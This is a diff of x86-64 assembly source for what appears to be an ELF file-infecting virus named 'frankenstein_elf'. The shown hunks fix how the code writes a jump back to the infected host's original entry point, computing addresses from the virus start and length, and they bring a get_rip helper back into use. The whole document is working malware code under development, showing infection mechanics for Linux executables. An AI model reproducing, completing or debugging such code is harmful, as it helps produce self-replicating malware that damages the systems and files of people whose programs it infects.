@@ -911,14 +911,16 @@ frankenstein_elf:
 ;
 	.write_jmp_to_oep:
 		xor r11, r11
+		xor r10, r10
+		mov r10, qword [r14 + 400] ;evaddr = $vxstart
 		mov rdx, 30
 		mov r11, qword [r14 + 448]
 		mov byte [r14 + 150], 0xe8			;call get_rip
 		mov dword [r14 + 151], 0x14			;at offset of 0x14 from curr instruction
-		mov dword [r14 + 155], 0x2d48			;sub rax, vlen
+		mov dword [r14 + 155], 0x2d48			;sub rax, vlen+5(length of get_rip instructions)
 		mov dword [r14 + 157], vlen+5			
 		mov dword [r14 + 161], 0x2d48			;sub rax, vxstart
-		mov dword [r14 + 163], vxstart			
+		mov dword [r14 + 163], r10d			
 		mov dword [r14 + 167], 0x0548			;add rax, OEP
 		mov dword [r14 + 169], r11d			
 		mov word [r14 + 173], 0xe0ff			;0xff 0xe0 = jump eax
@@ -1026,6 +1028,9 @@ frankenstein_elf:
 fin_infect:
 	ret
 PAGESIZE: dd 4096	
+get_rip:
+	mov rax, [rsp]
+	ret
 ;;restore stack to original state
 _restore:
 	add rsp, 0x2000
@@ -1033,9 +1038,6 @@ _restore:
 	pop rbp
 vend:
 vlen equ vend - vxstart
-;get_rip:
-;	mov rax, [rsp]
-;	ret
 _end:
 	xor rdi, rdi
 	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
